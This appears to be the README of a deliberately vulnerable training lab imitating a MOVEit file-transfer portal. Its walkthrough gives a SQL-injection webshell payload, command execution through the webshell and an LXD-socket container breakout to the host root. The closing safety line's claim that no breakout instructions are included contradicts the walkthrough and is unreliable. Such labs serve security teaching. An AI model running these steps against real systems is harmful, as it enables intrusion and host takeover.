# MOVEit LXD Lab

This repository provides a single-host cybersecurity training environment that simulates an enterprise-managed file transfer appliance. The UI and workflows are inspired by secure transfer portals, while the implementation is original and intended for classroom review, defensive analysis, and environment operations practice.

## Architecture

- Host platform: Ubuntu Server 22.04
- Host services: Docker and LXD
- Web tier: one Docker container named `moveit-web`
- Application stack: Flask, MySQL, Jinja templates, Bootstrap
- Application port: `8080` (exposed directly on the host via Docker host networking)
- Runtime model: container runs as `www-data` with a read-only root filesystem and writable `tmpfs` mounts only for `/tmp` and `/var/www/uploads`

### Application surfaces

The web application includes:

- `/register`
- `/login`
- `/dashboard`
- `/upload`
- `/files`
- `/admin`
- `/logs`
- `/readme.txt`

### Simulated enterprise filesystem

The container includes these realistic directories and placeholder content:

- `/opt/devops`
- `/opt/backups`
- `/var/log/moveit`
- `/var/www/uploads`
- `/home/www-data/flag1.txt`

The host setup script creates:

- `/root/flag2.txt`

## Installation

Run the installer from the repository root:

```bash
cd moveit-lxd-lab
sudo ./setup.sh
```

The script will:

1. Install Docker if it is missing.
2. Install LXD if it is missing.
3. Initialize LXD.
4. Build the `moveit-web` image.
5. Start the container with Docker Compose.
6. Create the host marker file.
7. Print the lab URL.

## Project Layout

- `docker-compose.yml`: container runtime configuration
- `setup.sh`: host bootstrap script
- `moveit-web/app.py`: Flask routes, authentication, SQLite initialization, and upload handling
- `moveit-web/templates/`: enterprise UI pages
- `moveit-web/static/css/style.css`: application styling
- `moveit-web/static/js/app.js`: upload page interactions

## Exploit Walkthrough

This lab contains a single intended attack chain designed for educational purposes. The walkthrough below outlines the steps an attacker would take to compromise the system.

### Step 1: Register a User Account
- Navigate to `/register` and create a new user account.
- Log in at `/login` to access the portal.

### Step 2: Discover Service Version Disclosure
- Access the public endpoint `/readme.txt` to obtain version information.
- Note the version `2023.1.4` and the security advisory mentioning a SQL injection vulnerability similar to CVE-2023-34362.

### Step 3: Identify the Vulnerability
- On the `/upload` page, examine the form fields: filename, description, and transfer notes.
- The transfer notes field is vulnerable to SQL injection in the upload metadata handler.

### Step 4: Exploit SQL Injection
- Craft a malicious payload in the transfer notes field to inject SQL.
- Example payload: `'); SELECT writefile('/var/www/uploads/shell.php','LAB_WEBSHELL'); --`
- This uses SQLite's `writefile` function to create a webshell file.

### Step 5: Upload Webshell
- Submit the upload form with the injected payload.
- The webshell is written to `/var/www/uploads/shell.php`.

### Step 6: Obtain Shell Inside Docker Container
- Access the webshell at `/uploads/shell.php?cmd=id`.
- Commands execute as `www-data` user.
- Confirm container compromise by reading `/home/www-data/flag1.txt`.

### Step 7: Discover LXD Unix Socket
- The host LXD socket is mounted at `/var/snap/lxd/common/lxd/unix.socket`.
- Use the webshell to interact with LXD.

### Step 8: Launch Privileged LXC Container
- Install LXC client if needed: `apt update && apt install -y lxc-client`.
- Copy Alpine image: `lxc image copy images:alpine local: --alias alpine`.
- Launch privileged container: `lxc launch alpine attacker`.
- Set privileged: `lxc config set attacker security.privileged true`.
- Mount host root: `lxc config device add attacker host-root disk source=/ path=/mnt/root recursive=true`.

### Step 9: Mount Host Filesystem
- Execute shell in container: `lxc exec attacker /bin/sh`.
- Host filesystem is mounted at `/mnt/root`.

### Step 10: Read Host Flag
- Read the host flag: `cat /mnt/root/root/flag2.txt`.

## Operational Notes

- User registration is enabled at `/register`.
- Passwords are stored using `bcrypt`.
- The public `/readme.txt` endpoint exposes simulated version information to mirror typical enterprise deployments.
- The upload workflow is designed for defensive code-review training and environment validation.

## Reset Instructions

To rebuild and restart the application:

```bash
cd moveit-lxd-lab
docker compose down
docker compose up -d --build
```

To clear the runtime container and start fresh:

```bash
cd moveit-lxd-lab
docker compose down --remove-orphans
docker compose up -d --build
```

## Cleanup

To stop and remove the lab container and local image:

```bash
cd moveit-lxd-lab
docker compose down --rmi local
```

To remove the host marker file:

```bash
sudo rm -f /root/flag2.txt
```

If you want to remove LXD from the host after the exercise:

```bash
sudo snap remove lxd
```

## Safety

This repository is intended for isolated training infrastructure you control. It avoids shipping active exploitation guidance or live breakout instructions.
